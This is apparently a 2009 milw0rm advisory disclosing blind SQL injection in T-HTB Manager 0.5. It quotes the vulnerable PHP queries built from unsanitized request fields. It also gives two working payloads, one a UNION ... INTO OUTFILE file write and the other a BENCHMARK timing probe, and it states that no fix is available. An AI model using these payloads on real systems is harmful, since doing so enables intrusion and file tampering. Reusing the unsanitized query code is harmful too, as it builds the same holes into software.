@@ -1,0 +1,106 @@
+********   Salvatore "drosophila" Fresta   ********
+
+[+] Application: T-HTB Manager
+[+] Version: 0.5
+[+] Website: http://sourceforge.net/apps/mediawiki/t-htbmanager/index.php?title=Main_Page
+
+[+] Bugs: [A] Multiple Blind SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 10 Sep 2009
+
+[+] Discovered by: Salvatore Fresta aka drosophila
+[+] Author: Salvatore Fresta aka drosophila
+[+] E-mail: drosophilaxxx [at] gmail.com
+
+
+***************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+***************************************************
+
+[+] Bugs
+
+
+- [A] Multiple Blind SQL Injection
+
+[-] Risk: medium
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: index.php
+
+All fields in this script are not sanitized but any
+outputs aren't returned.
+
+...
+
+	case 'delete_category':
+      $id = $_GET['id'];
+      $id_interfaces = $_GET['id_interfaces'];
+
+      if($id>0)
+      {
+        $query =  "SELECT rgt, lft FROM ".$table_name." WHERE id='" . $id . "'";
+        $db_query = mysql_query($query);
+        
+...
+
+    case 'update_category':
+      $name = $_POST['name'];
+      $id = $_POST['id'];
+
+      $rate  	= $_POST['rate'];
+      $ceil  	= $_POST['ceil'];
+      $burst 	= $_POST['burst'];
+      $prio  	= $_POST['prio'];
+      $monitor  = $_POST['monitor'];
+
+      if(strlen($name)>0 && $id>0)
+      {
+        $nodelft = $_POST['nodelft'];
+
+        $lft = $_POST['lft'];
+        $rgt = $_POST['rgt'];
+
+        $query = "UPDATE ".$table_name." set name='" . $name . "' ,  lft='" . $lft . "' , rgt = '" . $rgt . "', rate= '" . $rate . "', ceil = '" . $ceil . "', burst = '" . $burst . "', prio = '" . $prio . "', monitor = '" . $monitor . "' WHERE id='" . $id . "'";
+             
+...
+
+And many others..
+
+
+***************************************************
+
+[+] Code
+
+
+- [A] Multiple Blind SQL Injection
+
+This is a Blind SQL Injection bug but into the
+database there aren't very reserved information
+such as usernames and/or passwords. However this
+injection can be used to write arbitrary files
+on the server (when allowed).
+
+http://site/path/index.php?action=delete_category&id=1' UNION ALL SELECT NULL,'evil code' INTO OUTFILE '/tmp/file.php
+
+Send it as a POST packet:
+
+action=update_category&id=9999&name=blabla' WHERE 1=0 OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23
+
+
+***************************************************
+
+[+] Fix
+
+No fix.
+
+
+***************************************************
+
+# milw0rm.com [2009-09-10]
